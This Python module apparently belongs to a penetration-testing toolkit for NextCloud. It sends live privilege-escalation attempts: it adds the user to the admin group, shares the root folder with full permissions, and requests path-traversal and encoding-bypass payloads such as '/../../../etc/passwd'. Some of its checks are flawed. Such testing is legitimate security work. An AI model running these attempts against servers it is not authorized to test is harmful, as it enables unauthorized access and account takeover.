# nextcloud/nc_auth.py
"""
NextCloud Auth Escalation Testing Module
Tests for privilege escalation, token reuse, permission bypasses
"""

import requests
import json
from typing import Dict, List, Any
from rich.console import Console
import config
import time

console = Console()

class NCAuth:
    """NextCloud authentication and authorization testing"""
    
    def __init__(self, session: requests.Session):
        self.session = session
        self.host = config.NEXTCLOUD_HOST.rstrip("/")
        self.findings = []

    def run(self) -> List[Dict[str, Any]]:
        """Execute auth escalation tests"""
        console.print("[cyan]Starting auth escalation testing...[/cyan]")
        
        # Test admin access
        self.test_admin_access()
        
        # Test role modification
        self.test_role_modification()
        
        # Test token reuse
        self.test_token_reuse()
        
        # Test permission bypass
        self.test_permission_bypass()
        
        # Test group escalation
        self.test_group_escalation()
        
        console.print(f"[green]✓ Auth tests complete: {len(self.findings)} findings[/green]")
        return self.findings

    def test_admin_access(self):
        """Test if non-admin can access admin endpoints"""
        console.print("  [cyan]Testing admin endpoint access...[/cyan]")
        
        admin_endpoints = [
            "/ocs/v2.php/apps/admin_audit/api/v1/logs",
            "/ocs/v2.php/apps/provisioning_api/api/v1/config/apps",
            "/settings/admin/",
            "/ocs/v2.php/apps/user_ldap/api/v1/config",
        ]
        
        accessible = []
        
        for endpoint in admin_endpoints:
            try:
                resp = self.session.get(
                    f"{self.host}{endpoint}",
                    headers={"OCS-APIRequest": "true"},
                    timeout=config.NEXTCLOUD_TIMEOUT,
                    verify=config.NEXTCLOUD_VERIFY_SSL
                )
                
                # 200 or 403 are both interesting (200 = vulnerable, 403 = auth working)
                if resp.status_code == 200:
                    accessible.append({
                        "endpoint": endpoint,
                        "status": 200,
                        "content_type": resp.headers.get("content-type")
                    })
                    console.print(f"    [red]✗ Admin endpoint accessible: {endpoint}[/red]")
                    time.sleep(config.NEXTCLOUD_RATE_LIMIT_SEC)
                    
            except Exception as e:
                pass
        
        if accessible:
            self.findings.append({
                "type": "admin_access",
                "severity": "critical",
                "count": len(accessible),
                "endpoints": accessible,
                "description": "Non-admin can access admin endpoints",
                "impact": "Full system compromise, privilege escalation"
            })

    def test_role_modification(self):
        """Test if own role/permissions can be modified"""
        console.print("  [cyan]Testing role modification...[/cyan]")
        
        try:
            # Try to add self to admin group
            resp = self.session.post(
                f"{self.host}/ocs/v2.php/apps/provisioning_api/api/v1/groups/admin/users",
                headers={"OCS-APIRequest": "true"},
                data={"userid": config.NEXTCLOUD_USERNAME},
                timeout=config.NEXTCLOUD_TIMEOUT,
                verify=config.NEXTCLOUD_VERIFY_SSL
            )
            
            if resp.status_code == 200:
                self.findings.append({
                    "type": "role_modification",
                    "severity": "critical",
                    "endpoint": "/ocs/v2.php/apps/provisioning_api/api/v1/groups/admin/users",
                    "description": "User can modify own role to admin",
                    "impact": "Complete privilege escalation"
                })
                console.print(f"    [red]✗ Self can be added to admin group[/red]")
                
            # Try to modify share permissions
            resp = self.session.post(
                f"{self.host}/ocs/v2.php/apps/files_sharing/api/v1/shares",
                headers={"OCS-APIRequest": "true"},
                data={
                    "path": "/",
                    "shareType": 0,
                    "shareWith": "admin",
                    "permissions": 31  # Full permissions
                },
                timeout=config.NEXTCLOUD_TIMEOUT,
                verify=config.NEXTCLOUD_VERIFY_SSL
            )
            
            if resp.status_code == 200:
                self.findings.append({
                    "type": "share_permission_escalation",
                    "severity": "high",
                    "endpoint": "/ocs/v2.php/apps/files_sharing/api/v1/shares",
                    "description": "User can create high-permission shares",
                    "impact": "File access escalation"
                })
                console.print(f"    [red]✗ Can grant high permissions on shares[/red]")
                time.sleep(config.NEXTCLOUD_RATE_LIMIT_SEC)
                
        except Exception as e:
            console.print(f"    [yellow]Role modification test error: {str(e)}[/yellow]")

    def test_token_reuse(self):
        """Test if app tokens can be reused or hijacked"""
        console.print("  [cyan]Testing token security...[/cyan]")
        
        try:
            # Check for token in headers
            resp = self.session.get(
                f"{self.host}/ocs/v2.php/apps/provisioning_api/api/v1/apps",
                headers={"OCS-APIRequest": "true"},
                timeout=config.NEXTCLOUD_TIMEOUT,
                verify=config.NEXTCLOUD_VERIFY_SSL
            )
            
            # Check if auth is properly enforced
            if "Authorization" in resp.request.headers:
                auth_header = resp.request.headers["Authorization"]
                if auth_header.startswith("Basic "):
                    import base64
                    decoded = base64.b64decode(auth_header.split(" ")[1]).decode()
                    if ":" in decoded:
                        self.findings.append({
                            "type": "basic_auth_used",
                            "severity": "medium",
                            "description": "Basic authentication used (should be token/bearer)",
                            "impact": "Credentials exposed in headers (requires HTTPS)"
                        })
                        console.print(f"    [yellow]Basic auth used (verify HTTPS)[/yellow]")
            
        except Exception as e:
            pass

    def test_permission_bypass(self):
        """Test if file permissions can be bypassed"""
        console.print("  [cyan]Testing permission bypass...[/cyan]")
        
        bypass_attempts = [
            # Path traversal
            {"path": "/../../../etc/passwd", "method": "traversal"},
            # Null byte injection
            {"path": "/file.txt%00.php", "method": "null_byte"},
            # Case sensitivity
            {"path": "/File.txt", "method": "case"},
            # Double encoding
            {"path": "/%252e%252e/", "method": "double_encode"},
        ]
        
        bypassed = []
        
        for attempt in bypass_attempts:
            try:
                resp = self.session.get(
                    f"{self.host}/remote.php/dav/files/{config.NEXTCLOUD_USERNAME}{attempt['path']}",
                    timeout=config.NEXTCLOUD_TIMEOUT,
                    verify=config.NEXTCLOUD_VERIFY_SSL
                )
                
                if resp.status_code == 200:
                    bypassed.append({
                        "method": attempt["method"],
                        "path": attempt["path"],
                        "status": 200
                    })
                    console.print(f"    [red]✗ Bypass via {attempt['method']}[/red]")
                    time.sleep(config.NEXTCLOUD_RATE_LIMIT_SEC)
                    
            except Exception as e:
                pass
        
        if bypassed:
            self.findings.append({
                "type": "permission_bypass",
                "severity": "high",
                "count": len(bypassed),
                "bypass_methods": bypassed,
                "description": "File permissions can be bypassed",
                "impact": "Unauthorized file access"
            })

    def test_group_escalation(self):
        """Test if can join/create privileged groups"""
        console.print("  [cyan]Testing group escalation...[/cyan]")
        
        try:
            # Try to create a group with admin name
            resp = self.session.post(
                f"{self.host}/ocs/v2.php/apps/provisioning_api/api/v1/groups",
                headers={"OCS-APIRequest": "true"},
                data={"groupid": "admin_test"},
                timeout=config.NEXTCLOUD_TIMEOUT,
                verify=config.NEXTCLOUD_VERIFY_SSL
            )
            
            if resp.status_code == 200:
                self.findings.append({
                    "type": "group_escalation",
                    "severity": "high",
                    "endpoint": "/ocs/v2.php/apps/provisioning_api/api/v1/groups",
                    "description": "User can create privileged groups",
                    "impact": "Group-based privilege escalation"
                })
                console.print(f"    [red]✗ Can create privileged groups[/red]")
                
        except Exception as e:
            pass
